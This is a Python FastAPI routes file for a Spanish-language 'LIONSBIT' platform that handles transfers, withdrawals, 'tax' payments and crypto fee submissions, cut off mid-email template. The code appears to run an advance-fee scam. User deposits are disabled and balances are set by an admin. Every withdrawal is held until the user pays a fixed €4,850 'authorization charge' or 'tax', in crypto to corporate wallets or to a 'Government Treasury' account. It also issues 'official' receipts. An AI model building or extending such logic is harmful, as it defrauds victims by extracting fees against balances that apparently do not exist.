"""Transaction, withdrawal, and tax payment routes"""
from fastapi import APIRouter, HTTPException, Depends
from fastapi.responses import StreamingResponse, Response
from typing import List
from datetime import datetime, timezone, timedelta
import asyncio
import uuid
import logging
import io
import csv
from collections import defaultdict
from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch

from config import (
    db, TAX_AMOUNT, MIN_TAX_PAYMENT, EXCHANGE_RATES,
    DAILY_TRANSFER_LIMIT_EUR, UNVERIFIED_TRANSFER_LIMIT_EUR, GOVERNMENT_TREASURY_ID,
    CRYPTO_WALLETS
)
from models import TransactionCreate, PayTaxRequest, CryptoPaymentSubmission
from services.auth import get_current_user, get_admin_user, generate_transaction_reference
from services.notifications import create_notification, create_admin_notification, notify_admins, log_system_activity
from services.email import (
    send_email_background, get_email_template,
    send_withdrawal_status_email, send_withdrawal_tax_pending_email,
    send_tax_payment_received_email, send_withdrawal_request_received_email
)
from services.helpers import get_daily_transfer_total, check_fraud_pattern, ensure_government_treasury, compute_withdrawal_requirements
from services.audit import log_withdrawal_audit

router = APIRouter()

@router.post("/transactions")
async def create_transaction(tx_data: TransactionCreate, current_user: dict = Depends(get_current_user)):
    # Check if account is suspended
    if current_user.get('account_status') == 'suspended':
        raise HTTPException(status_code=403, detail='Account is suspended. Contact support.')
    
    if current_user.get('account_status') == 'under_review':
        raise HTTPException(status_code=403, detail='Account is under review. Transfers are temporarily blocked.')
    
    account = await db.accounts.find_one({'id': tx_data.account_id, 'user_id': current_user['id']}, {'_id': 0})
    if not account:
        raise HTTPException(status_code=404, detail='Account not found')
    
    now = datetime.now(timezone.utc).isoformat()
    tx_id = str(uuid.uuid4())
    currency = tx_data.currency.upper()
    balance_field = f'balance_{currency.lower()}'
    
    status = 'completed'
    transaction_reference = None
    
    if tx_data.transaction_type == 'deposit':
        # Deposits are disabled for regular users - only admin can add balance
        raise HTTPException(status_code=403, detail='Deposits are disabled. Contact administrator to add funds to your account.')
        
    elif tx_data.transaction_type == 'withdraw':
        # Verify KYC status before allowing withdrawal
        if current_user.get('verification_status') != 'verified':
            raise HTTPException(
                status_code=403, 
                detail='Para solicitar un retiro debe completar primero la verificación de identidad (KYC).'
            )

        # Partial Withdrawal Unlock (40%) activation gate — REMOVED.
        # Only 100% withdrawals are offered now; the €4,850 authorization charge
        # is paid AFTER the request is created (status 'pending_tax' → crypto fee).

        if account[balance_field] < tx_data.amount:
            raise HTTPException(status_code=400, detail='Fondos insuficientes')
        
        # Validate banking info is provided
        if not tx_data.banking_info:
            raise HTTPException(status_code=400, detail='La información bancaria es requerida para retiros')
        
        # Withdrawals require tax payment before admin approval
        status = 'pending_tax'
        transaction_reference = generate_transaction_reference()
        
        # Create notification about withdrawal request and authorization charge requirement
        await create_notification(current_user['id'], 'Solicitud de Retiro - Cargo de Autorización Pendiente',
            f'Su solicitud de retiro de {tx_data.amount} {currency} ha sido recibida. Para autorizar y procesar su retiro, debe abonar el Cargo de autorización y procesamiento del retiro ({TAX_AMOUNT:,.2f} EUR). Referencia: {transaction_reference}')
        
        # Log withdrawal request for admin notification
        await db.admin_notifications.insert_one({
            'id': str(uuid.uuid4()),
            'type': 'withdrawal_request',
            'user_id': current_user['id'],
            'user_email': current_user['email'],
            'user_name': current_user['name'],
            'amount': tx_data.amount,
            'currency': currency,
            'reference': transaction_reference,
            'status': 'pending_tax',
            'message': f'{current_user["name"]} solicitó un retiro de {tx_data.amount:,.2f} {currency}. Ref: {transaction_reference}. Estado: Pendiente de abono.',
            'created_at': datetime.now(timezone.utc).isoformat()
        })
        
        # Send email about tax requirement
        await send_withdrawal_tax_pending_email(
            user_email=current_user['email'],
            user_name=current_user['name'],
            withdrawal_amount=tx_data.amount,
            currency=currency,
            tax_required=TAX_AMOUNT,
            tax_paid=0
        )
        await log_withdrawal_audit(
            operation_id='', action='created', reference=transaction_reference,
            user_id=current_user['id'], user_name=current_user['name'],
            old_status=None, new_status='pending_tax',
            amount=tx_data.amount, currency=currency, method='cripto',
            notes='Solicitud de retiro recibida · Pendiente de requisitos previos al procesamiento',
        )
        
    elif tx_data.transaction_type == 'transfer':
        if not tx_data.recipient_account_id:
            raise HTTPException(status_code=400, detail='Recipient account required for transfer')
        
        # Convert amount to EUR for limit checks
        amount_eur = tx_data.amount if currency == 'EUR' else tx_data.amount * EXCHANGE_RATES['EUR']
        
        # KYC verification check
        if current_user.get('verification_status') != 'verified':
            if amount_eur > UNVERIFIED_TRANSFER_LIMIT_EUR:
                raise HTTPException(
                    status_code=400, 
                    detail=f'Unverified accounts are limited to {UNVERIFIED_TRANSFER_LIMIT_EUR} EUR per transfer. Please complete KYC verification.'
                )
        
        # Daily limit check
        daily_total = await get_daily_transfer_total(current_user['id'])
        if daily_total + amount_eur > DAILY_TRANSFER_LIMIT_EUR:
            remaining = max(0, DAILY_TRANSFER_LIMIT_EUR - daily_total)
            raise HTTPException(
                status_code=400,
                detail=f'Daily transfer limit exceeded. Remaining limit: {remaining:.2f} EUR'
            )
        
        # Anti-fraud check
        is_fraudulent = await check_fraud_pattern(current_user['id'], tx_data.amount)
        if is_fraudulent:
            await db.users.update_one(
                {'id': current_user['id']},
                {'$set': {'account_status': 'under_review'}}
            )
            await create_notification(current_user['id'], 'Account Under Review',
                'Your account has been flagged for review due to unusual activity. Transfers are temporarily blocked.')
            await notify_admins('Fraud Alert',
                f'User {current_user["name"]} ({current_user["email"]}) flagged for suspicious activity.')
            raise HTTPException(status_code=403, detail='Account flagged for review due to suspicious activity.')
        
        if account[balance_field] < tx_data.amount:
            raise HTTPException(status_code=400, detail='Insufficient funds')
        
        recipient = await db.accounts.find_one({'id': tx_data.recipient_account_id}, {'_id': 0})
        if not recipient:
            raise HTTPException(status_code=404, detail='Recipient account not found')
        
        # Validate account number format (10-20 alphanumeric characters)
        if not tx_data.recipient_account_id or len(tx_data.recipient_account_id) < 10:
            raise HTTPException(status_code=400, detail='Invalid account number format. Must be at least 10 characters.')
        
        # Deduct from sender
        new_sender_balance = account[balance_field] - tx_data.amount
        await db.accounts.update_one({'id': tx_data.account_id}, {'$set': {balance_field: new_sender_balance}})
        
        status = 'pending_tax'
        transaction_reference = generate_transaction_reference()
        
        await create_notification(current_user['id'], 'Transfer Created',
            f'Transfer of {tx_data.amount} {currency} created. Reference: {transaction_reference}. Tax payment required.')
    else:
        raise HTTPException(status_code=400, detail='Invalid transaction type')
    
    transaction = {
        'id': tx_id,
        'account_id': tx_data.account_id,
        'user_id': current_user['id'],
        'transaction_type': tx_data.transaction_type,
        'amount': tx_data.amount,
        'currency': currency,
        'status': status,
        'description': tx_data.description or f'{tx_data.transaction_type.capitalize()} of {tx_data.amount} {currency}',
        'recipient_account_id': tx_data.recipient_account_id,
        'transaction_reference': transaction_reference,
        'created_at': now
    }
    
    if tx_data.transaction_type == 'transfer':
        transaction['tax_required'] = TAX_AMOUNT
        transaction['tax_paid'] = 0.0
        transaction['released_at'] = None
    
    # Withdrawals - save banking info WITH tax system
    if tx_data.transaction_type == 'withdraw':
        # Add tax fields for withdrawal
        transaction['tax_required'] = TAX_AMOUNT
        transaction['tax_paid'] = 0.0
        transaction['status_timeline'] = [{
            'at': now,
            'status': 'pending_tax',
            'status_label': 'Retiro solicitado · Pendiente de abono',
            'actor_role': 'user',
        }]
        
        # Add banking info to the transaction
        if tx_data.banking_info:
            transaction['banking_info'] = {
                'account_holder': tx_data.banking_info.account_holder,
                'iban': tx_data.banking_info.iban,
                'account_number': tx_data.banking_info.account_number,
                'swift_code': tx_data.banking_info.swift_code,
                'routing_number': tx_data.banking_info.routing_number,
                'bank_name': tx_data.banking_info.bank_name,
                'bank_country': tx_data.banking_info.bank_country,
                'bank_city': tx_data.banking_info.bank_city,
                'account_type': tx_data.banking_info.account_type
            }
        
        # Notify admin about withdrawal request
        await create_admin_notification(
            notification_type='withdrawal_request',
            title='Nueva Solicitud de Retiro - Pendiente de Abono',
            message=f'{current_user["name"]} solicitó un retiro de {tx_data.amount:,.2f} {tx_data.currency}. Ref: {transaction_reference}. Estado: Pendiente de abono (Cargo de autorización y procesamiento del retiro).',
            user_info={
                'name': current_user['name'],
                'email': current_user['email'],
                'ip': 'N/A',
                'country': 'N/A'
            },
            metadata={
                'amount': tx_data.amount, 
                'currency': tx_data.currency,
                'reference': transaction_reference,
                'status': 'pending_tax',
                'bank_name': tx_data.banking_info.bank_name if tx_data.banking_info else 'N/A',
                'iban_last4': tx_data.banking_info.iban[-4:] if tx_data.banking_info and tx_data.banking_info.iban else (tx_data.banking_info.account_number[-4:] if tx_data.banking_info and tx_data.banking_info.account_number else 'N/A'),
                'tax_required': TAX_AMOUNT
            }
        )
        
        # Log system activity
        await log_system_activity(
            activity_type='withdrawal',
            description=f'Solicitud de retiro: ${tx_data.amount:,.2f} {tx_data.currency} - Impuesto pendiente',
            user_id=current_user['id'],
            user_name=current_user['name'],
            user_email=current_user['email'],
            metadata={
                'amount': tx_data.amount, 
                'currency': tx_data.currency,
                'bank_name': tx_data.banking_info.bank_name if tx_data.banking_info else 'N/A'
            }
        )
        
        # Send email about withdrawal request with tax pending
        await send_withdrawal_tax_pending_email(
            user_email=current_user['email'],
            user_name=current_user['name'],
            withdrawal_amount=tx_data.amount,
            currency=currency,
            tax_required=TAX_AMOUNT,
            tax_paid=0.0
        )
    
    await db.transactions.insert_one(transaction)

    if tx_data.transaction_type == 'withdraw':
        bank_label = tx_data.banking_info.bank_name if tx_data.banking_info else 'Transferencia bancaria'
        asyncio.create_task(send_withdrawal_request_received_email(
            user_email=current_user['email'],
            user_name=current_user['name'],
            reference=transaction_reference,
            requested_at=now,
            amount_text=f"{tx_data.amount:,.2f} {currency}",
            net_text=f"{tx_data.amount:,.2f} {currency}",
            fee_text=f"Cargo de autorización y procesamiento del retiro: {TAX_AMOUNT:,.2f} EUR (se abona por separado)",
            method_text=bank_label,
            status_text='Pendiente de impuesto',
        ))

    # Return transaction without MongoDB _id field
    return {k: v for k, v in transaction.items() if k != '_id'}

@router.get("/transactions")
async def get_transactions(
    limit: int = 10,
    skip: int = 0,
    current_user: dict = Depends(get_current_user)
):
    transactions = await db.transactions.find(
        {'user_id': current_user['id']},
        {'_id': 0}
    ).sort('created_at', -1).skip(skip).limit(limit).to_list(limit)
    
    return transactions

@router.get("/transactions/all")
async def get_all_transactions(current_user: dict = Depends(get_current_user)):
    transactions = await db.transactions.find(
        {'user_id': current_user['id']},
        {'_id': 0}
    ).sort('created_at', -1).to_list(1000)
    
    return transactions

@router.get("/transactions/stats")
async def get_transaction_stats(current_user: dict = Depends(get_current_user)):
    """Get transaction statistics for the last 30 days"""
    thirty_days_ago = (datetime.now(timezone.utc) - timedelta(days=30)).isoformat()
    
    transactions = await db.transactions.find({
        'user_id': current_user['id'],
        'created_at': {'$gte': thirty_days_ago}
    }, {'_id': 0}).to_list(1000)
    
    total_sent = 0
    total_received = 0
    total_tax_paid = 0
    daily_data = {}
    
    for tx in transactions:
        date_key = tx['created_at'][:10]  # YYYY-MM-DD
        
        if date_key not in daily_data:
            daily_data[date_key] = {'sent': 0, 'received': 0, 'tax': 0}
        
        if tx['transaction_type'] == 'transfer':
            total_sent += tx['amount']
            daily_data[date_key]['sent'] += tx['amount']
            if tx.get('tax_paid', 0) > 0:
                total_tax_paid += tx.get('tax_paid', 0)
                daily_data[date_key]['tax'] += tx.get('tax_paid', 0)
        elif tx['transaction_type'] == 'deposit':
            total_received += tx['amount']
            daily_data[date_key]['received'] += tx['amount']
    
    # Fill missing days
    chart_data = []
    for i in range(30):
        date = (datetime.now(timezone.utc) - timedelta(days=29-i)).strftime('%Y-%m-%d')
        if date in daily_data:
            chart_data.append({
                'date': date,
                'sent': daily_data[date]['sent'],
                'received': daily_data[date]['received'],
                'tax': daily_data[date]['tax']
            })
        else:
            chart_data.append({'date': date, 'sent': 0, 'received': 0, 'tax': 0})
    
    return {
        'total_sent': total_sent,
        'total_received': total_received,
        'total_tax_paid': total_tax_paid,
        'chart_data': chart_data,
        'daily_limit': DAILY_TRANSFER_LIMIT_EUR,
        'daily_used': await get_daily_transfer_total(current_user['id'])
    }

@router.get("/transactions/export/csv")
async def export_transactions_csv(current_user: dict = Depends(get_current_user)):
    transactions = await db.transactions.find(
        {'user_id': current_user['id']},
        {'_id': 0}
    ).sort('created_at', -1).to_list(1000)
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Reference', 'Type', 'Amount', 'Currency', 'Status', 'Tax Paid', 'Description', 'Date'])
    
    for tx in transactions:
        writer.writerow([
            tx.get('transaction_reference', tx['id'][:8]),
            tx['transaction_type'],
            tx['amount'],
            tx['currency'],
            tx['status'],
            tx.get('tax_paid', 0),
            tx.get('description', ''),
            tx['created_at']
        ])
    
    output.seek(0)
    return StreamingResponse(
        iter([output.getvalue()]),
        media_type='text/csv',
        headers={'Content-Disposition': 'attachment; filename=transactions.csv'}
    )

@router.get("/withdrawals/history")
async def get_withdrawal_history(current_user: dict = Depends(get_current_user)):
    """Get user's withdrawal history grouped by date with privacy-safe data"""

    # Get all withdrawals for the user (excluding sensitive bank details)
    withdrawals = await db.transactions.find(
        {
            'user_id': current_user['id'],
            'transaction_type': 'withdraw'
        },
        {
            '_id': 0,
            'id': 1,
            'amount': 1,
            'currency': 1,
            'status': 1,
            'created_at': 1,
            'tax_required': 1,
            'tax_paid': 1
        }
    ).sort('created_at', -1).to_list(500)
    
    # Group by date
    grouped = defaultdict(list)
    today = datetime.now(timezone.utc).strftime('%Y-%m-%d')
    yesterday = (datetime.now(timezone.utc) - timedelta(days=1)).strftime('%Y-%m-%d')
    
    for w in withdrawals:
        date_key = w['created_at'][:10]  # YYYY-MM-DD
        grouped[date_key].append({
            'id': w['id'],
            'amount': w['amount'],
            'currency': w['currency'],
            'status': w['status'],
            'created_at': w['created_at'],
            'tax_required': w.get('tax_required', 0),
            'tax_paid': w.get('tax_paid', 0)
        })
    
    # Calculate statistics
    total_count = len(withdrawals)
    total_amount = sum(w['amount'] for w in withdrawals)
    completed_count = len([w for w in withdrawals if w['status'] == 'completed'])
    pending_count = len([w for w in withdrawals if w['status'] in ['pending', 'pending_tax', 'processing', 'transfer_in_progress']])
    
    # Format grouped data with labels
    history = []
    for date_key in sorted(grouped.keys(), reverse=True):
        items = grouped[date_key]
        if date_key == today:
            label = 'Hoy'
        elif date_key == yesterday:
            label = 'Ayer'
        else:
            label = date_key
        
        history.append({
            'date': date_key,
            'label': label,
            'count': len(items),
            'total_amount': sum(item['amount'] for item in items),
            'withdrawals': items
        })
    
    return {
        'statistics': {
            'total_count': total_count,
            'total_amount': total_amount,
            'completed_count': completed_count,
            'pending_count': pending_count
        },
        'history': history[:30]  # Last 30 days/groups
    }

@router.get("/transactions/{transaction_id}/receipt")
async def get_transaction_receipt(transaction_id: str, current_user: dict = Depends(get_current_user)):
    """Generate PDF receipt for completed transactions (transfers and withdrawals)"""
    transaction = await db.transactions.find_one(
        {'id': transaction_id, 'user_id': current_user['id']},
        {'_id': 0}
    )
    
    if not transaction:
        raise HTTPException(status_code=404, detail='Transaction not found')
    
    if transaction['status'] != 'completed':
        raise HTTPException(status_code=400, detail='Receipt only available for completed transactions')
    
    # Get user info
    user = await db.users.find_one({'id': current_user['id']}, {'_id': 0, 'password': 0})
    
    # Generate PDF
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=A4, topMargin=50, bottomMargin=50)
    styles = getSampleStyleSheet()
    
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Title'],
        fontSize=24,
        spaceAfter=30,
        textColor=colors.HexColor('#10b981')
    )
    
    subtitle_style = ParagraphStyle(
        'Subtitle',
        parent=styles['Heading2'],
        fontSize=16,
        spaceAfter=20,
        textColor=colors.HexColor('#1e293b')
    )
    
    elements = []
    
    # Header
    elements.append(Paragraph("LIONSBIT VERIFICACION", title_style))
    
    # Determine receipt type
    if transaction['transaction_type'] == 'withdraw':
        elements.append(Paragraph("Comprobante de Retiro", subtitle_style))
    else:
        elements.append(Paragraph("Comprobante de Transferencia", subtitle_style))
    
    elements.append(Spacer(1, 20))
    
    # Transaction details
    data = [
        ['Nombre del Usuario:', user.get('name', 'N/A')],
        ['Email:', user.get('email', 'N/A')],
        ['Referencia:', transaction.get('transaction_reference', transaction['id'][:12])],
        ['Fecha:', transaction['created_at'][:19].replace('T', ' ')],
        ['Tipo de Operación:', 'RETIRO' if transaction['transaction_type'] == 'withdraw' else transaction['transaction_type'].upper()],
        ['Monto:', f"{transaction['currency']} {transaction['amount']:.2f}"],
        ['Estado:', 'COMPLETADO'],
        ['ID de Transacción (TXID):', transaction.get('transaction_reference', transaction['id'][:16])],
    ]
    
    # Add banking info for withdrawals
    if transaction['transaction_type'] == 'withdraw' and transaction.get('banking_info'):
        banking_info = transaction['banking_info']
        data.extend([
            ['Titular de Cuenta:', banking_info.get('account_holder', 'N/A')],
            ['Banco:', banking_info.get('bank_name', 'N/A')],
        ])
        if banking_info.get('iban'):
            data.append(['IBAN:', banking_info.get('iban')])
        if banking_info.get('account_number'):
            data.append(['Número de Cuenta:', banking_info.get('account_number')])
        if banking_info.get('swift_code'):
            data.append(['SWIFT/BIC:', banking_info.get('swift_code')])
        if banking_info.get('routing_number'):
            data.append(['Routing Number:', banking_info.get('routing_number')])
        data.append(['País:', banking_info.get('bank_country', 'N/A')])
    
    # Add tax info if applicable
    if transaction.get('tax_paid'):
        data.append(['Impuesto Pagado:', f"${transaction.get('tax_paid', 0):.2f} USD"])
    
    # Add completed date
    if transaction.get('completed_at'):
        data.append(['Fecha de Completado:', transaction['completed_at'][:19].replace('T', ' ')])
    elif transaction.get('released_at'):
        data.append(['Fecha de Liberación:', transaction['released_at'][:19].replace('T', ' ')])
    
    # Add recipient for transfers
    if transaction['transaction_type'] == 'transfer' and transaction.get('recipient_account_id'):
        data.append(['Cuenta Destino:', transaction.get('recipient_account_id', 'N/A')[:12] + '...'])
    
    table = Table(data, colWidths=[2.2*inch, 3.8*inch])
    table.setStyle(TableStyle([
        ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
        ('FONTSIZE', (0, 0), (-1, -1), 11),
        ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
        ('TEXTCOLOR', (0, 0), (0, -1), colors.HexColor('#64748b')),
        ('TEXTCOLOR', (1, 0), (1, -1), colors.HexColor('#1e293b')),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
        ('TOPPADDING', (0, 0), (-1, -1), 12),
        ('LINEBELOW', (0, 0), (-1, -2), 0.5, colors.HexColor('#e2e8f0')),
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#f8fafc')),
    ]))
    elements.append(table)
    
    elements.append(Spacer(1, 30))
    
    # Success message
    success_style = ParagraphStyle(
        'Success',
        parent=styles['Normal'],
        fontSize=12,
        textColor=colors.HexColor('#10b981'),
        alignment=1  # Center
    )
    elements.append(Paragraph("✓ Transacción completada exitosamente", success_style))
    
    elements.append(Spacer(1, 40))
    
    # Footer
    footer_style = ParagraphStyle(
        'Footer',
        parent=styles['Normal'],
        fontSize=9,
        textColor=colors.HexColor('#94a3b8'),
        alignment=1  # Center
    )
    elements.append(Paragraph("Este es un comprobante oficial de LIONSBIT VERIFICACION.", footer_style))
    elements.append(Paragraph(f"Generado el {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}", footer_style))
    elements.append(Spacer(1, 10))
    elements.append(Paragraph("Procesado por: Lionsbit Financial System", footer_style))
    
    doc.build(elements)
    buffer.seek(0)
    
    return Response(
        content=buffer.getvalue(),
        media_type='application/pdf',
        headers={
            'Content-Disposition': f'attachment; filename=comprobante_{transaction.get("transaction_reference", transaction_id[:8])}.pdf'
        }
    )

# ==================== TAX PAYMENT ROUTE ====================

@router.post("/transactions/{transaction_id}/pay-tax")
async def pay_tax(transaction_id: str, tax_payment: PayTaxRequest, current_user: dict = Depends(get_current_user)):
    transaction = await db.transactions.find_one(
        {'id': transaction_id, 'user_id': current_user['id']},
        {'_id': 0}
    )
    
    if not transaction:
        raise HTTPException(status_code=404, detail='Transaction not found')
    
    # Tax payment applies to transfers and withdrawals
    if transaction['transaction_type'] not in ['transfer', 'withdraw']:
        raise HTTPException(status_code=400, detail='Tax payment only applies to transfers and withdrawals')
    
    if transaction['status'] != 'pending_tax':
        raise HTTPException(status_code=400, detail='This transaction does not require tax payment')
    
    # Minimum payment validation
    if tax_payment.amount < MIN_TAX_PAYMENT:
        raise HTTPException(status_code=400, detail=f'El monto minimo permitido es de {MIN_TAX_PAYMENT:.0f} EUR')
    
    from services.accounts_lifecycle import ensure_checking_account
    account = await ensure_checking_account(current_user['id'])
    
    # Tax is always paid in USD
    balance_field = 'balance_usd'
    
    if account[balance_field] < tax_payment.amount:
        raise HTTPException(status_code=400, detail='Insufficient USD funds to pay tax')
    
    # Deduct from user
    new_balance = account[balance_field] - tax_payment.amount
    await db.accounts.update_one({'id': account['id']}, {'$set': {balance_field: new_balance}})
    
    # Credit to Government Treasury
    await ensure_government_treasury()
    await db.accounts.update_one(
        {'id': GOVERNMENT_TREASURY_ID},
        {'$inc': {balance_field: tax_payment.amount}}
    )
    
    # Update transaction
    new_tax_paid = transaction.get('tax_paid', 0) + tax_payment.amount
    tax_required = transaction.get('tax_required', TAX_AMOUNT)
    remaining = max(0, tax_required - new_tax_paid)
    
    update_fields = {'tax_paid': new_tax_paid}
    
    await create_notification(current_user['id'], 'Tax Payment Received',
        f'Tax payment of ${tax_payment.amount:.2f} USD processed. Remaining: ${remaining:.2f} USD. Reference: {transaction.get("transaction_reference", "")}')
    
    # Send email about tax payment received
    user_info = await db.users.find_one({'id': current_user['id']}, {'_id': 0})
    if user_info:
        await send_tax_payment_received_email(
            user_email=user_info['email'],
            user_name=user_info['name'],
            payment_amount=tax_payment.amount,
            tax_required=tax_required,
            tax_paid=new_tax_paid,
            withdrawal_amount=transaction['amount'],
            currency=transaction['currency']
        )
    
    # Check if tax is fully paid
    timeline_entry = None
    if new_tax_paid >= tax_required:
        if transaction['transaction_type'] == 'transfer':
            # For transfers, release funds to recipient
            recipient = await db.accounts.find_one(
                {'id': transaction['recipient_account_id']},
                {'_id': 0}
            )
            
            if recipient:
                currency = transaction['currency']
                recipient_balance_field = f'balance_{currency.lower()}'
                new_recipient_balance = recipient[recipient_balance_field] + transaction['amount']
                await db.accounts.update_one(
                    {'id': transaction['recipient_account_id']},
                    {'$set': {recipient_balance_field: new_recipient_balance}}
                )
            
            update_fields['status'] = 'completed'
            update_fields['released_at'] = datetime.now(timezone.utc).isoformat()
            
            await create_notification(current_user['id'], 'Transfer Released',
                f'Transfer of {transaction["amount"]} {transaction["currency"]} has been released to recipient. Reference: {transaction.get("transaction_reference", "")}')
        
        elif transaction['transaction_type'] == 'withdraw':
            # For withdrawals, change status to pending (awaiting admin approval)
            update_fields['status'] = 'pending'
            update_fields['tax_completed_at'] = datetime.now(timezone.utc).isoformat()
            timeline_entry = {
                'at': update_fields['tax_completed_at'],
                'status': 'pending',
                'status_label': 'Abono verificado · Retiro autorizado',
                'actor_role': 'user',
            }
            
            await create_notification(current_user['id'], 'Tax Payment Complete - Withdrawal Processing',
                f'Tax payment complete! Your withdrawal of {transaction["amount"]} {transaction["currency"]} is now being processed. You will be notified once approved.')
            
            # Send email: tax complete, withdrawal now pending approval
            if user_info:
                await send_withdrawal_status_email(
                    user_email=user_info['email'],
                    user_name=user_info['name'],
                    amount=transaction['amount'],
                    currency=transaction['currency'],
                    status='pending'
                )
            
            # Notify admin about pending withdrawal
            await db.admin_notifications.insert_one({
                'id': str(uuid.uuid4()),
                'type': 'withdrawal_ready',
                'user_id': current_user['id'],
                'user_email': current_user['email'],
                'transaction_id': transaction_id,
                'amount': transaction['amount'],
                'currency': transaction['currency'],
                'message': 'Withdrawal ready for approval. Tax fully paid.',
                'created_at': datetime.now(timezone.utc).isoformat()
            })
    
    tx_update = {'$set': update_fields}
    if timeline_entry:
        tx_update['$push'] = {'status_timeline': timeline_entry}
    await db.transactions.update_one({'id': transaction_id}, tx_update)
    
    updated_tx = await db.transactions.find_one({'id': transaction_id}, {'_id': 0})
    return updated_tx

# ==================== CRYPTO TAX PAYMENT ROUTES ====================

# ==================== CRYPTO TAX PAYMENT ROUTES ====================

@router.get("/crypto-wallets")
async def get_crypto_wallets():
    """Direcciones de wallet corporativas HABILITADAS (config admin) para el cargo."""
    from services.wallet_config import get_enabled_wallets
    enabled = await get_enabled_wallets()
    return enabled or CRYPTO_WALLETS

@router.post("/transactions/{transaction_id}/pay-tax-crypto")
async def submit_crypto_tax_payment(
    transaction_id: str, 
    payment: CryptoPaymentSubmission,
    current_user: dict = Depends(get_current_user)
):
    """Submit crypto tax payment for admin review"""
    # Validate transaction belongs to user
    transaction = await db.transactions.find_one(
        {'id': transaction_id, 'user_id': current_user['id']},
        {'_id': 0}
    )
    
    if not transaction:
        raise HTTPException(status_code=404, detail='Transaction not found')
    
    if transaction['transaction_type'] not in ['transfer', 'withdraw']:
        raise HTTPException(status_code=400, detail='Tax payment only applies to transfers and withdrawals')
    
    if transaction['status'] not in ['pending_tax']:
        raise HTTPException(status_code=400, detail='This transaction does not require tax payment or is already under review')
    
    # Check if there's already a pending crypto payment for this transaction
    existing_payment = await db.crypto_payments.find_one({
        'transaction_id': transaction_id,
        'status': 'under_review'
    })
    
    if existing_payment:
        raise HTTPException(status_code=400, detail='Ya tiene un pago en revisión para esta transacción. Espere a que sea procesado.')
    
    # Validate crypto type
    valid_cryptos = list(CRYPTO_WALLETS.keys()) + ['BTC']
    if payment.crypto_type not in valid_cryptos:
        raise HTTPException(status_code=400, detail='Tipo de criptomoneda inválido')
    
    # Validate proof image size (max 5MB base64)
    if payment.proof_image and len(payment.proof_image) > 7000000:
        raise HTTPException(status_code=400, detail='Imagen muy grande (máximo 5MB)')
    
    # Create crypto payment record
    now = datetime.now(timezone.utc).isoformat()
    payment_id = str(uuid.uuid4())
    
    wallet_key = payment.crypto_type if payment.crypto_type in CRYPTO_WALLETS else 'BTC'
    
    crypto_payment = {
        'id': payment_id,
        'transaction_id': transaction_id,
        'user_id': current_user['id'],
        'crypto_type': payment.crypto_type,
        'wallet_address': CRYPTO_WALLETS.get(wallet_key, {}).get('address', ''),
        'network': payment.network or CRYPTO_WALLETS.get(wallet_key, {}).get('network', 'BTC'),
        'txid': payment.txid,
        'amount_sent': payment.amount_sent,
        'btc_address': getattr(payment, 'btc_address', None),
        'proof_image': payment.proof_image,
        'status': 'under_review',
        'submitted_at': now,
        'reviewed_at': None,
        'reviewed_by': None,
        'rejection_reason': None
    }
    
    await db.crypto_payments.insert_one(crypto_payment)

    await log_withdrawal_audit(
        operation_id=transaction_id, action='crypto_txid_submitted', reference=transaction.get('transaction_reference'),
        user_id=current_user['id'], user_name=current_user.get('name'),
        old_status=transaction.get('status'), new_status='crypto_payment_under_review',
        amount=float(payment.amount_sent or 0), currency='EUR', method='cripto',
        txid=payment.txid, network=payment.network,
        notes='TxID declarado por el usuario · Pago cripto recibido, pendiente de confirmaciones',
    )

    # Update transaction status
    await db.transactions.update_one(
        {'id': transaction_id},
        {
            '$set': {'status': 'crypto_payment_under_review'},
            '$push': {'status_timeline': {
                'at': now,
                'status': 'crypto_payment_under_review',
                'status_label': 'Comprobante enviado · En revisión',
                'actor_role': 'user',
            }},
        }
    )
    
    # Notify user
    await create_notification(
        current_user['id'],
        'Pago Crypto Registrado',
        f'Su pago de {payment.crypto_type} ha sido registrado. TXID: {payment.txid[:20]}...'
    )
    
    # Notify admin
    await create_admin_notification(
        notification_type='crypto_payment',
        title='Nuevo Pago Crypto Recibido',
        message=f'{current_user["name"]} ha enviado un pago de ${payment.amount_sent} USD en {payment.crypto_type}',
        user_info={'name': current_user['name'], 'email': current_user['email']},
        metadata={'payment_id': payment_id, 'txid': payment.txid, 'amount': payment.amount_sent}
    )
    
    # Send email to admin (with attached proof image)
    try:
        from services.proof_forwarder import forward_proof_to_admin
        # Detect filename from data URI if it's an image
        proof_filename = None
        if payment.proof_image:
            mime = payment.proof_image.split(';', 1)[0].replace('data:', '') if payment.proof_image.startswith('data:') else ''
            ext = {'image/jpeg': 'jpg', 'image/png': 'png', 'image/webp': 'webp', 'application/pdf': 'pdf'}.get(mime, 'jpg')
            proof_filename = f"crypto_payment_{payment_id[:8]}.{ext}"
        await forward_proof_to_admin(
            proof_type=f'Pago Crypto ({payment.crypto_type})',
            user=current_user,
            proof_file_b64=payment.proof_image,
            proof_filename=proof_filename,
            fields={
                'Monto': f'${payment.amount_sent} USD',
                'Crypto': payment.crypto_type,
                'Red': payment.network or '—',
                'TXID': payment.txid,
                'Payment ID': payment_id,
                'Transaction ID': transaction_id,
            },
        )
    except Exception as e:
        logging.error(f'[crypto-payment] forward_proof failed: {e}')
    
    # Send confirmation to user (background)
    user_email = f"""
        <p style="color: #e2e8f0; font-size: 16px;">Estimado/a <strong style="color: #10b981;">{current_user['name']}</strong>,</p>
        <p style="color: #e2e8f0; font-size: 16px;">Su pago en criptomonedas ha sido registrado correctamente.</p>
        <table width="100%" style="background-color: #0f172a; border-radius: 12px; margin: 20px 0;">
            <tr><td style="padding: 25px;">
                <table width="100%">
                    <tr><td style="color: #94a3b8; padding: 8px 0; border-bottom: 1px solid #334155;">Monto:</td>
                        <td style="color: #f97316; text-align: right; padding: 8px 0; border-bottom: 1px solid #334155; font-weight: bold;">${payment.amount_sent} USD</td></tr>
                    <tr><td style="color: #94a3b8; padding: 8px 0; border-bottom: 1px solid #334155;">Crypto:</td>
